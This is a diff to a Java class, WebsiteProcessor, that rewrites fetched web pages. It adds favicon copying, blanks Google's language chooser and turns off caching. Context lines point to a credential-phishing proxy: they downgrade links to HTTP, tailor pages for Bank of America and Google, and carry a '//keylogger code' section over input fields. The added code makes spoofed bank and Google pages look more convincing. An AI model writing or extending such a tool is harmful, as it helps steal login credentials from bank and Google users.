@@ -63,7 +63,10 @@ public class WebsiteProcessor {
 		
 		//add jquery
 		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
-		
+		Element iconHeader = doc.select("meta[itemprop]").first();
+		if(iconHeader!=null && iconHeader.attr("content")!=null){
+			doc.head().prepend("<link rel='shortcut icon' href='"+"http://"+getBase()+iconHeader.attr("content")+"'>");
+		}
 		//downgrade all src href links to http
 		Elements links = doc.select("img");
 		links.addAll(doc.select("input"));
@@ -86,6 +89,11 @@ public class WebsiteProcessor {
 			boa.append(dataF);
 		}
 		/*Needed for Bank of America*/
+		/*Needed for Bank of google*/
+		Elements googs = doc.select("#lang-chooser-wrap");
+		for(Element goog:googs){
+			goog.html("");
+		}
 		//keylogger code
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
@@ -117,6 +125,7 @@ public class WebsiteProcessor {
 		if(method.equals("POST")){
 			conn.setDoOutput(true);
 		}
+		conn.setDefaultUseCaches(false);
 		conn.setInstanceFollowRedirects( true );
 		conn.setRequestProperty("User-Agent", USER_AGENT);
 		conn.setRequestProperty("Accept",
